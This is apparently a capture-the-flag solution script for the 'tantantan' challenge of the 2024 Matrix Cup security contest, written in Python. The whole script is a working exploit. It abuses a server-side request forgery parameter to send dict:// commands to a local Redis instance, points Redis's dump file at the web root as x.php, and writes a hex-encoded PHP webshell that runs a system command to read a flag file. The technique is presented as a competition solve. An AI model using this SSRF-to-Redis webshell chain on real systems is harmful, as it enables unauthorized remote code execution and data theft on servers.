# 矩阵杯网络安全大赛2024 tantantan
import requests

url = "http://xxx/aaabbb.php"


requests.post(url, {"data": f"dict://127.0.0.1:6379/config:set:dir:/var/www/html"})
requests.post(url, {"data": f"dict://127.0.0.1:6379/config:set:dbfilename:x.php"})
webshell = b'<?php system("cat /9jsh267sbh1312h7dn2"); ?>'.hex()
payloadhex = ""
for i in range(0, len(webshell), 2):
    payloadhex += "\\x" + webshell[i:i+2]
requests.post(url, {"data": f'dict://127.0.0.1:6379/set:webshell:"{payloadhex}"'})
print(requests.get("http://x.php").text)